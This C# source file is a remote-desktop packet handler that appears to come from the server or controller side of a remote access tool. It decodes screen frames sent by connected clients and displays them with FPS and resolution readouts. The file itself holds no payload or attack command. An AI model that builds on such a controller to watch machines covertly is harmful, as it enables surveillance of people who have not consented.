using Server.Forms;
using Server.Helper;
using Server.MessagePack;
using Server.Connection;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace Server.Handle_Packet
{
    public class HandleRemoteDesktop
    {
        public void Capture(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                FormRemoteDesktop RD = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + unpack_msgpack.ForcePathObject("ID").AsString];
                try
                {
                    if (RD != null)
                    {
                        if (RD.Client == null)
                        {
                            RD.Client = client;
                            RD.labelWait.Visible = false;
                            RD.timer1.Start();
                            byte[] RdpStream0 = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                            int Screens = Convert.ToInt32(unpack_msgpack.ForcePathObject("Screens").GetAsInteger());
                            RD.numericUpDown2.Maximum = Screens - 1;
                        }

                        byte[] RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                        lock (RD.syncPicbox)
                        {
                            using (MemoryStream stream = new MemoryStream(RdpStream))
                            {
                                RD.GetImage = RD.decoder.DecodeData(stream);
                            }

                            RD.pictureBox1.Image = RD.GetImage;
                            RD.FPS++;
                            if (RD.sw.ElapsedMilliseconds >= 1000)
                            {
                                RD.Text = "RemoteDesktop:" + client.ID + "    FPS:" + RD.FPS + "    Screen:" + RD.GetImage.Width + " x " + RD.GetImage.Height + "    Size:" + Methods.BytesToString(RdpStream.Length);
                                RD.FPS = 0;
                                RD.sw = Stopwatch.StartNew();
                            }
                        }
                    }
                    else
                    {
                        client.Disconnected();
                        return;
                    }
                }
                catch (Exception ex) { Debug.WriteLine(ex.Message); }
            }
            catch { }
        }
    }
}
